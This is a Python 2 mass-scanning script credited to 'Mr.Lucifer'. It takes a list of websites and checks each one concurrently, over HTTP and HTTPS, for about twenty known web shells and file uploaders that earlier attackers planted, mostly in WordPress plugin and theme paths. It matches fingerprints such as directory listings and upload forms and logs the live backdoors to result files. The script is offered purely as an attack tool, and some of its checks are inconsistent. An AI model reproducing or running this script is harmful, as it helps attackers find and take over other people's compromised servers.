import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
import os
if not os.path.exists('Result'):
    os.makedirs('Result')

init(autoreset = True)
fr = Fore.RED
fw = Fore.WHITE
fg = Fore.GREEN
print '\n __      __      .__   _____        ________  \n/  \\    /  \\____ |  |_/ ____\\ ___  _\\_____  \\ \n\\   \\/\\/   /  _ \\|  |\\   __\\  \\  \\/ //  ____/ \n \\        (  <_> )  |_|  |     \\   //       \\ \n  \\__/\\  / \\____/|____/__|      \\_/ \\_______ \\\n       \\/                                   \\/\n\n       [!] 20+ active Vuln Exploit [!]\n'
requests.urllib3.disable_warnings()
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com' }

try:
    target = [ i.strip() for i in open(sys.argv[1], mode = 'r').readlines() ]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


def URLdomain(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    elif site.startswith('https://'):
        site = site.replace('https://', '')
    pattern = re.compile('(.*)/')
    while re.findall(pattern, site):
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site


def FourHundredThree(url):
    
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/updates.php', headers = headers, allow_redirects = True, timeout = 15)
        if '<input type="password" name="password">' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/cfwk.txt', 'a').write(url + '/wp-content/updates.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/updates.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if '<input type="password" name="password">' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/cfwk.txt', 'a').write(url + '/wp-content/updates.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/index.php?3x=3x', headers = headers, allow_redirects = True, timeout = 15)
        if '<title>Upload files...</title>' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/index.txt', 'a').write(url + '/index.php?3x=3x\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/index.php?3x=3x', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if '<title>Upload files...</title>" value="Upload"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/index.txt', 'a').write(url + '/index.php?3x=3x\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'Public Shell Version 2.0' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/w0rdpr3ssnew.txt', 'a').write(url + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/w0rdpr3ssnew/about.phpp', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'Faizzz-Chin ShellXploit' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/w0rdpr3ssnew.txt', 'a').write(url + '/wp-content/plugins/w0rdpr3ssnew/about.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk', headers = headers, allow_redirects = True, timeout = 15)
        if 'type="file"><input type="submit" value="Upload"' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/ioptimization.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'type="file"><input type="submit" value="Upload"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/ioptimization.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/TOPXOH/wDR.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/TOPXOH.txt', 'a').write(url + '/wp-content/plugins/TOPXOH/wDR.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/TOPXOH/wDR.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/TOPXOH.txt', 'a').write(url + '/wp-content/plugins/TOPXOH/wDR.php\n')
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'Upl0od Your T0ols' in check.content or 'CodeD BY Ahmad Hamde' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/ROOBOTS.txt', 'a').write(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'Upl0od Your T0ols' in check.content or 'CodeD BY Ahmad Hamde' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/ROOBOTS.txt', 'a').write(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/index.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/Random_Shells.txt', 'a').write(url + '/wp-content/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/index.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/Random_Shells.txt', 'a').write(url + '/wp-content/index.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/ws.php', headers = headers, allow_redirects = True, timeout = 15)
        if '<span>Upload file:</span>' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/Random_Shells.txt', 'a').write(url + '/ws.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/ws.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if '<span>Upload file:</span>' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/Random_Shells.txt', 'a').write(url + '/ws.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/shell.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/Random_Shells.txt', 'a').write(url + '/shell.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/shell.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/Random_Shells.txt', 'a').write(url + '/shell.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/shell20211028.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/shell20211028.txt', 'a').write(url + '/shell20211028.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/shell20211028.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/shell20211028.txt', 'a').write(url + '/shell20211028.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/shell20211028.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/shell20211028.txt', 'a').write(url + '/wp-content/shell20211028.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/shell20211028.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/shell20211028.txt', 'a').write(url + '/wp-content/shell20211028.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/wso112233.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/wso112233.txt', 'a').write(url + '/wp-content/wso112233.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/wso112233.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/wso112233.txt', 'a').write(url + '/wp-content/wso112233.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wso112233.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/wso112233.txt', 'a').write(url + '/wso112233.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wso112233.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/wso112233.txt', 'a').write(url + '/wso112233.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/seotheme/mar.php', headers = headers, allow_redirects = True, timeout = 15)
        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/marijuana.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/themes/seotheme/mar.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/marijuana.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/seoplugins/mar.php', headers = headers, allow_redirects = True, timeout = 15)
        if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/marijuana.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/seoplugins/mar.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/marijuana.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/instabuilder2/cache/up.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'input type="submit" name="upload" value="upload"' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/instabuilder2.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/instabuilder2/cache/up.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'input type="submit" name="upload" value="upload"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/instabuilder2.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/pridmag/db.php?u', headers = headers, allow_redirects = True, timeout = 15)
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/pridmag.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/themes/pridmag/db.php?u', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/pridmag.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/ccx/index.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'Negat1ve Shell' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/ccx.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/ccx/index.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'Negat1ve Shell' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/ccx.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/ccx/index.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'Negat1ve Shell' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/ccx.txt', 'a').write(url + '/ccx/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/ccx/index.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'Negat1ve Shell' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/ccx.txt', 'a').write(url + '/ccx/index.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/ccx/index.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'Negat1ve Shell' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/ccx.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/themes/ccx/index.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'Negat1ve Shell' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/ccx.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-info.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/Random_Shells.txt', 'a').write(url + '/wp-info.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-info.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/Random_Shells.txt', 'a').write(url + '/wp-info.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/406.php', headers = headers, allow_redirects = True, timeout = 15)
        if 'drwxr-xr-x' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('Result/Random_Shells.txt', 'a').write(url + '/406.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/406.php', headers = headers, allow_redirects = True, verify = False, timeout = 15)
            if 'drwxr-xr-x' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Result/Random_Shells.txt', 'a').write(url + '/406.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except:
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    


mp = Pool(150)
mp.map(FourHundredThree, target)
mp.close()
mp.join()
print '\n [!] Coded By Mr.Lucifer [!] Decoded and Cleaned By HYPERRR'
